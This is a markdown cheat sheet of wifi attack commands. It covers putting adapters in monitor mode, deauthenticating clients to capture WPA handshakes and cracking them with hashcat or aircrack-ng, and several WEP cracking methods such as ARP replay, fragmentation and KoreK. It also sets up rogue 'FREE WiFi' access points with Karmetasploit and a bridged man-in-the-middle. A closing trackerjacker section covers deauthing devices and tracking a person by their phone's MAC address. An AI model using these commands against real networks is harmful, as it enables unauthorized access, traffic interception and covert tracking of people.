## Wifi Hacking

**Set interface down**
```
sudo ip link set wlan0 down
```
**Set monitor mode**
```
iwconfig wlan0 mode monitor
```
**Turn up interface**
```
ip link set wlan0 up
```

**Use airmon-ng to put int into monitor mode**
```
airmon-ng start wlan0
```

**listen for all nearby beacon frames to get target BSSID and**
```
airodump-ng wlan0 --band abg
```

**Set 5 GHz channel**
```  
iwconfig wlan0 channel 149
```

**Start listening for the handshake**
```
airodump-ng -c 149 --bssid P4:E4:E4:92:60:71 -w cap01.cap wlan0
```

**Deauth a connected client to force a handshake**
```
aireplay-ng -D -0 2 -a 9C:5C:8E:C9:AB:C0 -c P4:E4:E4:92:60:71 wlan0
```

**Convert cap to hccapx**
```
aircrack-ng -J file.cap capture.hccap
```

**Crack with hashcat**
```
hashcat.exe -m 2500 capture.hccapx rockyou.txt
```

**Setting TX POWER**
```
iw reg set BO
iwconfig wlan1 txpower 25
```

**Cracking WPA**
```
airmon-ng start wlan0
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
aircrack-ng -0 -w (wordlist path) (caputure filename)
```

**Cracking WEP with Connected Clients**
```
airmon-ng start wlan0 ( channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {disassociation attack}
aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}
```

**Cracking WEP via a Client**
```
airmon-ng start wlan0 (channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
aireplay-ng -2 -b (AP MAC) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
aireplay-ng -2 -r (replay cap file) wlan0mon {inject using cap file}
aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
```

**ARP amplification**
```
airmon-ng start wlan0 ( channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 500 -q 8 -a (AP MAC) wlan0mon
areplay-ng -5 -b (AP MAC) -h (OUR MAC) wlan0mon
packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k 255.255.255.255 -l 255.255.255.255 -y (FRAGMENT.xor) -w (filename.cap)
tcpdump -n -vvv -e -s0 -r (replay_dec.#####.cap)
packetforge-ng -0 -a (AP MAC) -h (OUR MAC) -k (destination IP) -l (source IP) -y (FRAGMENT.xor) -w (filename.cap)
aireplay-ng -2 -r (filename.cap) wlan0mon
```

**Cracking WEP /w shared key AUTH**
```
airmon-ng start wlan0 ( channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
~this will error out~aireplay-ng -1 0 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
aireplay-ng -1 60 -e (ESSID) -y (sharedkeyfile) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication /w PRGA xor file}
aireplay-ng -3 -b (AP MAC) -h (OUR MAC) wlan0mon {ARP replay attack}
aireplay-ng -0 1 -a (AP MAC) -c (VIC CLIENT) wlan0mon {deauthentication attack}
aircrack-ng -0 -z(PTW) -n 64(64bit) filename.cap
```

**Cracking a Clientless WEP (FRAG AND KOREK)**
> **FRAG**
```
airmon-ng start wlan0 (channel)
airodump-ng -c (channel) –bssid (AP MAC) -w (filename) wlan0mon
aireplay-ng -1 60 -e (ESSID) -a (AP MAC) -h (OUR MAC) wlan0mon {fake authentication}
~aireplay-ng -5 (frag attack) -b (AP MAC) -h (OUR MAC) wlan0mon
packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255 -k 255.255.255.255 -y (fragment filename) -w filename.cap
tcpdump -n -vvv -e -s0 -r filename.cap {TEST}
aireplay-ng -2 -r filename.cap wlan0mon
```

> **KOREK**
```
~aireplay-ng -4 -b (AP MAC) -h (OUR MAC) wlan0mon
tcpdump -s 0 -s -e -r replayfilename.cap
packetforge-ng -0 -a (APMAC) -h (OUR MAC) -l 255.255.255.255(source IP) -k 255.255.255.255(dest IP) -y (fragmentfilename xor) -w filename.cap
aireplay-ng -2 -r filename.cap wlan0mon
aircrack-ng -0 filename.cap
```

**Karmetasploit**
```
airbase-ng -c (channel) -P -C 60 -e “FREE WiFi” -v wlan0mon
ifconfig at0 up 10.0.0.1/24
mkdir -p /var/run/dhcpd
chown -R dhcpd:dhcpd /var/run/dhcpd
touch /var/lib/dhcp3/dhcpd.leases
cat dhcpd.conf
touch /tmp/dhcp.log
chown dhcpd:dhcpd /tmp/dhcp.log
dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0
msfconsole -r /root/karma.rc
```

**Bridge CTRL man in the middle SETUP**
```
airebase-ng -c 3 -e “FREE WiFi” wlan0mon
brctl addbr hacker(interface name)
brctl addif hacker eth0
brctl addif hacker at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig hacker 192.168.1.8 up
ifconfig hacker
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**pyrit DB attacks**
```
pyrit eval
pyrit -i (wordlist) import_passwords
pyrit -e (essid) create_essid
pyrit batch
pyrit batch -r (capturefile) -b(AP MAC) attack_db
pyrit strip
pyrit -r (capturefile) -o (capturefile output) strip
pyrit dictionary attack
pyrit -r (capturefile) -i (/pathtowordlist) -b (AP MAC) attack_passthrough
```

**airgraph-ng**
```
airgraph-ng -i filename.csv -g CAPR -o outputfilename.png
eog outputfilename.png
airgraph-ng -i filename.csv -g CPG -o outputfilename.png
eog outputfilename.png
```

**airdecap-ng**
```
airdecap-ng -b (vic ap) outputfilename.cap
wireshark outputfilename.cap
airdecap-ng -w (WEP KEY) (capturefile.cap)
wireshark capturefile-DEC.cap
airdecap-ng -e (ESSID VIC) -p (WPA PASSWORD) (capturefile.cap)
wireshark capturefile-dec.cap
```

## trackerjacker

Like nmap for mapping wifi networks you're not connected to. Maps and tracks wifi networks and devices through raw 802.11 monitoring.  [PyPI page](https://pypi.python.org/pypi/trackerjacker)

**trackerjacker can help with the following**
* I want to know all the nearby wifi networks **and know all the devices connected to each network.**
* I want to know who's hogging all the bandwidth.
* I want to run a command when this MAC address sends more than 100000 bytes in a 30 second window (maybe to determine when an IP camera is uploading a video, which is indicative that it just saw motion).
* I want to deauth anyone who uses more than 100000 bytes in a 10 second window.
* I want to deauth every Dropcam in the area so my Airbnb hosts don't spy on me.
* I want to be alerted when any MAC address is seen at a power level greater than -40dBm that I've never seen before.
* I want to see when this particular person is nearby (based on the MAC of their mobile phone) and run a command to alert me.
* I want to write my own plugin to run some script to do something fun every time a new Apple device shows up nearby.

**Usage**

Map command
```
trackerjacker -i wlan1337 --map
```

Track mode with trigger command
* Track mode allows you to specify some number of MAC addresses to watch, and if any specific devices exceeds the threshold (in bytes), specified here with the `-t 4000` (specifying an alert threshold of 4000 bytes) an alert will be triggered.
```
trackerjacker --track -m 3c:2e:ff:31:32:59 --t 4000 --trigger-command "./alert.sh" --channels-to-monitor 10,11,12,44
```

Track mode with foxhunt plugin
```
trackerjacker -i wlan1337 --track --trigger-plugin foxhunt
```
Displays a curses screen like this:
```
POWER        DEVICE ID                VENDOR

    =======        =================        ================================

     -82dBm        1c:1b:68:35:c6:5d        ARRIS Group, Inc.

     -84dBm        fc:3f:db:ed:e9:8e        Hewlett Packard

     -84dBm        dc:0b:34:7a:11:63        LG Electronics (Mobile Communications)

     -84dBm        94:62:69:af:c3:64        ARRIS Group, Inc.

     -84dBm        90:48:9a:34:15:65        Hon Hai Precision Ind. Co.,Ltd.

     -84dBm        64:00:6a:07:48:13        Dell Inc.

     -84dBm        00:30:44:38:76:c8        CradlePoint, Inc

     -86dBm        44:1c:a8:fc:c0:53        Hon Hai Precision Ind. Co.,Ltd.

     -86dBm        18:16:c9:c0:3b:75        Samsung Electronics Co.,Ltd

     -86dBm        01:80:c2:62:9e:36

     -86dBm        01:00:5e:11:90:47

     -86dBm        00:24:a1:97:68:83        ARRIS Group, Inc.

     -88dBm        f8:2c:18:f8:f3:aa        2Wire Inc

     -88dBm        84:a1:d1:a6:34:08
```

Track mode with trigger plugin
* This runs `examples/plugin_example1.py` every time `3c:2e:ff:31:32:59` is seen sending/receiving 10 bytes or more.
```
trackerjacker --track -m 3c:2e:ff:31:32:59 --threshold 10 --trigger-plugin examples/plugin_example1.py --channels-to-monitor 10,11,12,44 --trigger-cooldown 1
```

trackerjacker plugins are simply python files that contain either:

* `Trigger` class which defines a `__call__(**kwargs)` method (example: `examples/plugin_example1.py`)

* `trigger(**kwargs)` function (example: `examples/plugin_example2.py`)

And optionally a `__apiversion__ = 1` line (for future backward compatibility)

**Configuring with config file**
```
trackerjacker.py -c my_config.json
```
And here's the example config file called `my_config.json`:
```
{
    "iface": "wlan1337",
    "devices_to_watch": {"5f:cb:53:1c:8a:2c": 1000, "32:44:1b:d7:a1:5b": 2000},
    "aps_to_watch": {"c6:23:ef:33:cc:a2": 500},
    "threshold_window": 10,
    "channels_to_monitor": [1, 6, 11, 52],
    "channel_switch_scheme": "round_robin"
}
```

**Enable monitor mode**
```
trackerjacker --monitor-mode-on -i wlan0
```
**Disable monitor mode**
```
trackerjacker --monitor-mode-off -i wlan0mon
```
**Set adapter channel**
```
trackerjacker --set-channel 11 -i wlan0
```

## Recommended hardware
* Panda PAU07 N600 Dual Band (nice, small, 2.4GHz and 5GHz)
* Panda PAU09 N600 Dual Band (higher power, 2.4GHz and 5GHz)
* Alfa AWUS052NH Dual-Band 2x 5dBi (high power, 2.4GHz and 5GHz, large, ugly)
* TP-Link N150 (works well, but not dual band)

